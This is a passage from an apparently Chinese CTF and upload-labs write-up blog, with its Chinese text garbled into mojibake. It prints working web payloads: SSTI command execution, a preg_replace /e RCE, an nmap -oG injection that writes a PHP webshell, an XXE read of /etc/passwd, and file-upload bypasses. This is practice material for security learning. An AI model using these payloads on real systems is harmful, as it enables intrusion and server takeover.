å¦‚æœå…¶ä¸­ä¸€ä¸ªç­‰äº &#x27;flag&#x27;ï¼Œè¾“å‡º $is çš„å€¼å¹¶ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ    exit($is); &#125; // æœ€åè¾“å‡ºå˜é‡ $flag çš„å€¼ echo &quot;the flag is: &quot;.$flag; ?&gt;</span></span><br></pre></td></tr></table></figure>æŸ¥çœ‹æºç è€ƒå¯Ÿå˜é‡è¦†ç›–å°±æ˜¯é€šè¿‡ä¸ºå˜é‡èµ‹å€¼å¦å¤–çš„ä¸€ä¸ªå˜é‡çš„å˜é‡åæ¥è¿›è¡Œç»•è¿‡?handsome=flag&flag=x&x=flag[CISCN2019 åä¸œå—èµ›åŒº]Web11æ ¹æ®å†…å®¹æ¨æµ‹ssrf<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707103155907.png" class="" title="image-20250707103155907">æ›´æ”¹ä¸ºæœ¬åœ°ipï¼Œå‘ç°å³ä¸Šè§’IPåœ°å€æ”¹å˜ï¼Œåº”è¯¥æ˜¯æ³¨å…¥ç‚¹fuzzè¯†åˆ«æ˜¯ä»€ä¹ˆæ³¨å…¥æ¼æ´åº”è¯¥æ˜¯sstiæ¨¡æ¿æ³¨å…¥dirsearchæ‰«æå‘ç°æ˜¯smarty æ¨¡æ¿{system('cat /flag')}ä¸Šç½‘æŸ¥å¯»å¯ä»¥ç›´æ¥ä½¿ç”¨systemè¿›è¡Œrce<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153124322.png" class="" title="image-20250707153124322"># [BJDCTF2020]The mystery of ipæŸ¥çœ‹ipæµ‹è¯•æ›´æ”¹æœ¬åœ°ipå‘ç°ä¼šç›´æ¥å›æ˜¾ï¼Œæµ‹è¯•sstiå‘ç°<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707153942714.png" class="" title="image-20250707153942714">æµ‹è¯•æ¨¡æ¿ç±»å‹<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154133792.png" class="" title="image-20250707154133792">å‘ç°æ˜¯smarty<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707154144518.png" class="" title="image-20250707154144518">ç›´æ¥ä½¿ç”¨systemè¿›è¡Œæµ‹è¯•èƒ½å¤Ÿç›´æ¥æ‰§è¡ŒæŒ‡ä»¤# [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤?text=php://input&file=php://filter/convert.base64-encode/resource=next.phpä½¿ç”¨inputå’Œfilteråè®®é˜…è¯»next.phpæ–‡ä»¶å†…å®¹<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æŸ¥çœ‹ä»£ç å‘ç°éœ€è¦ä½¿ç”¨getflagè¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œrceåœ¨php5ä¸­preg_replace /eå­˜åœ¨æ¼æ´å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œé€šè¿‡\Sè®©å…¶åŒ¹é…ç©ºå­—ç¬¦æ¥ç¡®å®šåé¢å¯ä»¥è°ƒç”¨getflagå‡½æ•°æ¥è¿›è¡Œrce\S*={${getFlag()}}&cmd=system('cat /flag');# [BUUCTF 2018]Online Tool<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">  @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">å…¶ä½¿ç”¨äº†</span><br><span class="line"></span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">  <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>æ¥é¿å…rceæ¼æ´ä½†æ˜¯å½“ä¸¤è€…ä¸€å—ä½¿ç”¨æ—¶åè€Œä¼šè§¦å‘æ¼æ´<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707170845298.png" class="" title="image-20250707170845298">å…¶ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰' <?php @eval($_POST["mayi"]);?><p> -oG mayi.php â€˜</p><p>åˆ©ç”¨nmapçš„å‚æ•°ç”Ÿæˆå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶å³å¯</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>é¢˜ç›®æç¤ºxxeæ³¨å…¥</p><table><thead><tr><th>function doLogin(){</th></tr></thead><tbody><tr><td>var username &#x3D; $(â€œ#usernameâ€).val();</td></tr><tr><td>var password &#x3D; $(â€œ#passwordâ€).val();</td></tr><tr><td>if(username &#x3D;&#x3D; â€œâ€ || password &#x3D;&#x3D; â€œâ€){</td></tr><tr><td>alert(â€œPlease enter the username and password!â€);</td></tr><tr><td>return;</td></tr><tr><td>}</td></tr><tr><td></td></tr><tr><td>var data &#x3D; â€œ<user><username>â€œ + username + â€œ</username><password>â€œ + password + â€œ</password></user>â€œ;</td></tr><tr><td>$.ajax({</td></tr><tr><td>type: â€œPOSTâ€,</td></tr><tr><td>url: â€œdoLogin.phpâ€,ä¸Š</td></tr><tr><td>contentType: â€œapplication&#x2F;xml;charset&#x3D;utf-8â€,</td></tr><tr><td>data: data,</td></tr><tr><td>dataType: â€œxmlâ€,</td></tr><tr><td>anysc: false,</td></tr><tr><td>success: function (result) {</td></tr><tr><td>var code &#x3D; result.getElementsByTagName(â€œcodeâ€)[0].childNodes[0].nodeValue;</td></tr><tr><td>var msg &#x3D; result.getElementsByTagName(â€œmsgâ€)[0].childNodes[0].nodeValue;</td></tr><tr><td>if(code &#x3D;&#x3D; â€œ0â€){</td></tr><tr><td>$(â€œ.msgâ€).text(msg + â€œ login fail!â€);</td></tr><tr><td>}else if(code &#x3D;&#x3D; â€œ1â€){</td></tr><tr><td>$(â€œ.msgâ€).text(msg + â€œ login success!â€);</td></tr><tr><td>}else{</td></tr><tr><td>$(â€œ.msgâ€).text(â€œerror:â€ + msg);</td></tr><tr><td>}</td></tr><tr><td>},</td></tr><tr><td>error: function (XMLHttpRequest,textStatus,errorThrown) {</td></tr><tr><td>$(â€œ.msgâ€).text(errorThrown + â€˜:â€™ + textStatus);</td></tr><tr><td>}</td></tr><tr><td>});</td></tr><tr><td>}</td></tr></tbody></table><p>æŸ¥çœ‹æºä»£ç é€šè¿‡postå°†å‚æ•°ä¼ å…¥é“doLogin.phpä¹‹ä¸­è¿›è¡Œåˆ¤æ–­</p><p>1111ä½¿ç”¨ä¸‹è¿°xmlè¿›è¡Œæµ‹è¯•<!DOCTYPE foo [<!ELEMENT foo ANY ><br><!ENTITY xxe SYSTEM "file:///etc/passwd" >]&gt;<br><foo>&xxe;</foo></p><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" ><p>]&gt;<br><foo>&xxe;</foo></p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707181749696.png" class="" title="image-20250707181749696"><p>å¯ç›´æ¥å‡ºæ¥æ•°æ®å†…å®¹ï¼Œæ³¨æ„xmlçš„æ ¼å¼åœ¨å¼•ç”¨æ—¶&amp;adminåéœ€è¦åŠ å…¥ï¼›</p><p>åœ¨xxeæ³¨å…¥ä¸­éœ€è¦æ³¨æ„xmlæ–‡ä»¶çš„æ ¼å¼</p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250707182448806.png" class="" title="image-20250707182448806"><p>å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¾“å…¥ä»€ä¹ˆå›æ˜¾ä»€ä¹ˆ</p><p>æµ‹è¯•ä¸ºsstiæ³¨å…¥</p><p>é€šè¿‡è¿›ä¸€æ­¥æµ‹è¯•å‘ç°ä¸ºjwitæ¨¡æ¿æ³¨å…¥</p><p>ä½¿ç”¨å¸¸ç”¨payloadè¿›è¡Œæ³¨å…¥ï¼ŒæˆåŠŸæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="VNCTF2023-è±¡æ£‹ç‹å­ã€"><a href="#VNCTF2023-è±¡æ£‹ç‹å­ã€" class="headerlink" title="[VNCTF2023]è±¡æ£‹ç‹å­ã€"></a>[VNCTF2023]è±¡æ£‹ç‹å­ã€</h1><p>åœ¨æºç é‡Œå‘ç°äº†jsæ··æ·†çš„ä»£ç </p><p>è¯¥å†…å®¹èƒ½ç›´æ¥æ‰§è¡Œæ•…ä¸¢åˆ°æ§åˆ¶å°å»çœ‹çœ‹æˆåŠŸè·å–flag</p><h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p>è¯¥é¢˜ç›®ä¸å‰é¢çš„</p><p>[BUUCTF 2018]Online Toolå¾ˆåƒåˆ©ç”¨nmapçš„-ogå‚æ•°å°†æœ¨é©¬å†™å…¥æ–‡ä»¶å†…ï¼Œä¸è¿‡è¯¥é¢˜ç›®é˜Ÿå¯¹phpæœ‰ä¸ªè¿‡æ»¤ä½¿ç”¨ä»¥ä¸‹payloadå³å¯</p><p>127.0.0.1 | â€˜ <?=@eval($_POST["cmd"]);?> -oG shell.phtml â€˜</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709114156059.png" class="" title="image-20250709114156059"><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>å‰ç½®çŸ¥è¯†ï¼š</p><p>WEB-INFæ˜¯javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚</p><p>1.WEB-INF&#x2F;web.xml</p><p>webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p><p>2.WEB-INF&#x2F;classes</p><p>åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„classæ–‡ä»¶ï¼ŒåŒ…æ‹¬servlet classå’Œéservlet class</p><p>3.WEB-INF&#x2F;lib</p><p>å­˜æ”¾webåº”ç”¨éœ€è¦çš„JARæ–‡ä»¶</p><p>4.WEB-INF&#x2F;src</p><p>æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶</p><p>5.WEB-INF&#x2F;database.properties</p><p>æ•°æ®åº“é…ç½®æ–‡ä»¶</p><p>6.WEB-INF&#x2F;tags</p><p>å­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶</p><p>7.WEB-INF&#x2F;jsp</p><p>jsp 1.2 ä¸€ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶å­˜æ”¾ä½ç½®ã€‚</p><p>8.WEB-INF&#x2F;jsp2</p><p>å­˜æ”¾jsp2.0ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ã€‚</p><p>9.META-INF</p><p>ç›¸å½“äºä¸€ä¸ªä¿¡æ¯åŒ…ã€‚</p><p>Tomcatçš„WEB-INFç›®å½•ï¼Œæ¯ä¸ªj2eeçš„webåº”ç”¨éƒ¨ç½²æ–‡ä»¶é»˜è®¤åŒ…å«è¿™ä¸ªç›®å½•ã€‚</p><p>Nginxåœ¨æ˜ å°„é™æ€æ–‡ä»¶æ—¶ï¼ŒæŠŠWEB-INFç›®å½•æ˜ å°„è¿›å»ï¼Œè€Œåˆæ²¡æœ‰åšNginxçš„ç›¸å…³å®‰å…¨é…ç½®ï¼ˆæˆ–Nginxè‡ªèº«ä¸€äº›ç¼ºé™·å½±å“ï¼‰ã€‚ä»è€Œå¯¼è‡´é€šè¿‡Nginxè®¿é—®åˆ°Tomcatçš„WEB-INFç›®å½•ï¼ˆè¯·æ³¨æ„è¿™é‡Œï¼Œæ˜¯é€šè¿‡Nginxï¼Œè€Œä¸æ˜¯Tomcatè®¿é—®åˆ°çš„ï¼Œå› ä¸ºä¸Šé¢å·²ç»è¯´åˆ°ï¼ŒTomcatæ˜¯ç¦æ­¢è®¿é—®è¿™ä¸ªç›®å½•çš„ã€‚ï¼‰ã€‚</p><p>ç›´æ¥åœ¨åŸŸååé¢åŠ ä¸ŠWEB-INF&#x2F;web.xmlå°±å¯ä»¥äº†</p><p>å½“æ”»å‡»è€…é€šè¿‡ä¼ å…¥æ¶æ„çš„<code>name</code>å‚æ•°å€¼ä¸º<code>WEB-INF/web.xml</code>æ—¶å¯ä»¥è¯»å–Webåº”ç”¨çš„é…ç½®ä¿¡æ¯</p><p>ç›¸å½“äºä¸€ä¸ªæ–‡ä»¶ä»»æ„è¯»å–</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250709151517513.png" class="" title="image-20250709151517513"><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h1 id="2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag"><a href="#2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag" class="headerlink" title="[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag"></a>[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag</h1><p>æ ¹æ®æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡flagé‚£å°±å¯»æ‰¾æ—¥å¿—æ–‡ä»¶</p><p>?<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>å‘å…ˆflagæ–‡ä»¶ä½†æ˜¯æœ‰è¿‡æ»¤</p><p>ç„¶åå°±æ˜¯æƒ³åŠæ³•ç»•è¿‡escapeshellarg</p><p>ç”±äºescapeshellargå¹¶ä¸ä¼šæ£€æµ‹æˆ–ç§»é™¤â€œä¸å¯è§å­—ç¬¦â€æ‰€ä»¥ä½¿ç”¨ä»¥ä¸‹payloadå³å¯</p><p>?cmd&#x3D;this_is_final_fl%ffag_e2a457126032b42d.php</p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2025/03/13/upload-labs/"/>
      <url>/2025/03/13/upload-labs/</url>
      
        <content type="html"><![CDATA[<p>upload-labsé¶åœºï¼ˆç”±äºç‰ˆæœ¬çš„é—®é¢˜è¯¥é¶åœºè¦ä½¿ç”¨php5ç­‰åç¼€åä¸èƒ½ä½¿ç”¨ntsç‰ˆçš„phpæœ€ç®€å•æ–¹æ³•ä½¿ç”¨è€ç‰ˆæœ¬phpstudyï¼Œç¬¬åäºŒå’Œç¬¬åä¸‰å…³çš„phpç‰ˆæœ¬è¦æ±‚åœ¨5.3ä»¥ä¸‹ä¸”<code>magic_quotes_gpc</code>ä¸ºå…³é—­çŠ¶æ€ï¼ˆéœ€è¦è‡ªå·±å…³é—­ï¼‰ï¼‰</p><h1 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h1><p>ç¬¬ä¸€å…³ä¸­ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶å‘ç°å…¶åªèƒ½ä¸Šä¼ jpg png gifè¿™ç§å›¾ç‰‡æ–‡ä»¶</p><p>å¹¶å‘ç°åœ¨ä¸Šä¼ æ“ä½œæ—¶æ— æ³•å¯¹å…¶è¿›è¡ŒæŠ“åŒ…æ‰€ä»¥ç¡®å®šå…¶ä¸ºå‰ç«¯éªŒè¯</p><img src="/2025/03/13/upload-labs/image-20250111172016864.png" class="" title="image-20250111172016864"><p>å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åç¼€æ”¹ä¸ºjpgè¿›è¡Œä¸Šä¼ å¹¶è¿›è¡ŒæŠ“åŒ…å¤„ç†</p><img src="/2025/03/13/upload-labs/image-20250111172252352.png" class="" title="image-20250111172252352"><p>ä½¿ç”¨bpæŠ“åŒ…å¹¶å°†æ–‡ä»¶åç¼€æ”¹ä¸ºphpåå‘ç°æˆåŠŸä¸Šä¼ æ–‡ä»¶<img src="/2025/03/13/upload-labs/image-20250111172439851.png" class="" title="image-20250111172439851"></p><p>ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸè¿æ¥æœ¨é©¬</p><img src="/2025/03/13/upload-labs/image-20250111172505100.png" class="" title="image-20250111172505100"><h1 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h1><p>ç¬¬äºŒå…³å‘ç°å…¶å¹¶ä¸æ˜¯å‰ç«¯éªŒè¯</p><img src="/2025/03/13/upload-labs/image-20250111173721227.png" class="" title="image-20250111173721227"><p>ä½†ç›´æ¥bpæŠ“åŒ…ä¿®æ”¹åç¼€åå³å¯æˆåŠŸä¸Šä¼ æœ¨é©¬ï¼Œä¹‹åä½¿ç”¨èšå‰‘è¿æ¥å³å¯</p><h1 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h1><p>ä¸Šä¼ phpæ–‡ä»¶åå‘ç°å…¶è®¾ç½®äº†é»‘åå•</p><img src="/2025/03/13/upload-labs/image-20250111173930664.png" class="" title="image-20250111173930664"><p>ä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ•…æŠ“åŒ…å°†phpæ–‡ä»¶åç¼€æ”¹ä¸ºphp5è¿›è¡Œå°è¯•</p><p>è¿›è¡Œå¤šæ¬¡å°è¯•å‘ç°æ–°ç‰ˆphpstudyé»˜è®¤ä¸‹è½½çš„phpç‰ˆæœ¬æœ‰é—®é¢˜æ•…è€Œå°†ç‰ˆæœ¬é€€å›2016è¿›è¡Œå°è¯•å®éªŒæˆåŠŸï¼ŒåŸå› æ˜¯å› ä¸ºæ–°ç‰ˆphpstudyä¸‹è½½çš„phpç‰ˆæœ¬å‡ä¸ºntsç‰ˆé…ç½®æ–‡ä»¶ä¸­æ— æ³•æ›´æ”¹è¯†åˆ«å†…å®¹æ•…å°†å…¶é€€å›2016ç‰ˆæœ¬å³å¯</p><p>è¯¦ç»†å†…å®¹å‚è€ƒè¯¥æ–‡ç« <a href="https://www.cnblogs.com/Article-kelp/p/14927087.html">å…³äºPHPStudyä¸­ä½¿ç”¨AddType application&#x2F;x-httpd-phpè¯¥Apacheçš„è®¾ç½®å‘½ä»¤æ— æ•ˆçš„é—®é¢˜ - Article_kelp - åšå®¢å›­</a></p><p>è¯¥é¢˜æ˜¯é»‘åå•è¿‡æ»¤ä½†å¹¶æœªè¿‡æ»¤æ‰php3æˆ–è€…php5è¿™ç±»æ–‡ä»¶æ•…æ›´æ”¹æ–‡ä»¶ååç¼€å³å¯</p><h1 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h1><p>é¦–å…ˆä¸Šä¼ phpæ–‡ä»¶å‘ç°è¢«åˆ—å…¥é»‘åå•äº†äºæ˜¯è¿›è¡Œä¸Šä¼ å…¶ä½™åç¼€åæ–‡ä»¶å¦‚php3 php5 phtmlå‡æ— æ³•ä¸Šä¼ </p><p>æ–¹æ³•ä¸€ï¼šäºæ˜¯æƒ³åˆ°æ›´æ”¹é…ç½®æ–‡ä»¶å°†jpgæ–‡ä»¶è§†ä¸ºphpè¿›è¡Œè§£æåè¿›è¡Œå®éªŒç¡®å®å¯ä»¥é€šè¿‡ã€‚ä½†æ˜¯è¯¥æ–¹æ³•éœ€è¦ç®¡ç†å‘˜æƒé™æ‰å¯ä½¿ç”¨</p><p>æ–¹æ³•äºŒï¼šä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å…¶èƒ½å¤Ÿå°†å…¶ä»–ç±»å‹çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œåœ¨æ–‡ä»¶ä¸­å†™å…¥AddType application&#x2F;x-httpd-php jpg.txtä½¿å…¶èƒ½å¤Ÿè§£æjpgæ–‡ä»¶å’Œtxtä¹‹åä¸Šä¼ è¿™ä¸¤ç§æ–‡ä»¶æœ¨é©¬ï¼Œä¹‹åä¸Šä¼ æœ¨é©¬å³å¯</p><img src="/2025/03/13/upload-labs/image-20250113104741686.png" class="" title="image-20250113104741686"><h1 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h1><p>é¦–å…ˆä¸Šä¼ ä¸€äº›æ–‡ä»¶å‘ç°.htaccessæ–‡ä»¶phpæ–‡ä»¶æ— æ³•ä¸Šä¼ ä½†æ˜¯txtå’Œjpgå’Œ.user.iniæ–‡ä»¶å¯ä»¥æ­£å¸¸ä¸Šä¼ </p><p>äºæ˜¯ä½¿ç”¨.user.iniæ–‡ä»¶è¿›è¡Œå°è¯•</p><p>ç¼–è¾‘æ–‡ä»¶å†…å®¹ä¸º<img src="/2025/03/13/upload-labs/image-20250113110229330.png" class="" title="image-20250113110229330"></p><p>æ¥ç¡®ä¿mumaæ–‡ä»¶è¢«åŒ…å«åœ¨phpæ–‡ä»¶å‰è¿›è¡Œè§£é‡Š</p><p>ä¹‹åä½¿ç”¨èšå‰‘è¿æ¥å…¶ä¸­çš„phpæ–‡ä»¶å³å¯</p><img src="/2025/03/13/upload-labs/image-20250113111646926.png" class="" title="image-20250113111646926"><h1 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h1><p>ä¸Šä¼ ä¸Šé¢é‚£äº›æ–‡ä»¶å‘ç°å‡æ— æ³•æ­£å¸¸ä½¿ç”¨äºæ˜¯è€ƒè™‘ç»•è¿‡</p><p>è¯¥å…³ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</p><img src="/2025/03/13/upload-labs/image-20250113121731927.png" class="" title="image-20250113121731927"><p>æ›´æ”¹åç¼€åå¤§å°å†™å³å¯</p><h1 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h1><p>è¯¥å…³ä½¿ç”¨ç©ºæ ¼ç»•è¿‡</p><img src="/2025/03/13/upload-labs/image-20250113122109907.png" class="" title="image-20250113122109907"><p>åœ¨æ–‡ä»¶åç¼€åŠ å…¥ç©ºæ ¼å³å¯</p><img src="/2025/03/13/upload-labs/image-20250113122215985.png" class="" title="image-20250113122215985"><h1 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h1><p>å°†å„ç§æ–‡ä»¶ä¸Šä¼ ä¸€éå‘ç°å‡è¡Œä¸é€šï¼Œé‡äº‹ä¸å†³çœ‹æºç </p><img src="/2025/03/13/upload-labs/image-20250113124019526.png" class="" title="image-20250113124019526"><p>è¯¥é¢˜å°†æ‰€æœ‰è¿›è¡Œåˆ©ç”¨çš„åç¼€åéƒ½åˆ—å…¥äº†é»‘åå•ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åˆ é™¤åç¼€åå.çš„åŠŸèƒ½äºæ˜¯ä»æ­¤ç€æ‰‹</p><p>åœ¨phpçš„åç¼€åååŠ å…¥ä¸€ä¸ª.å³å¯æˆåŠŸ</p><img src="/2025/03/13/upload-labs/image-20250113124427951.png" class="" title="image-20250113124427951"><h1 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h1><p>è€ƒå¯Ÿæ–‡ä»¶æ•°æ®æµ</p><p>ä¸Šä¼ 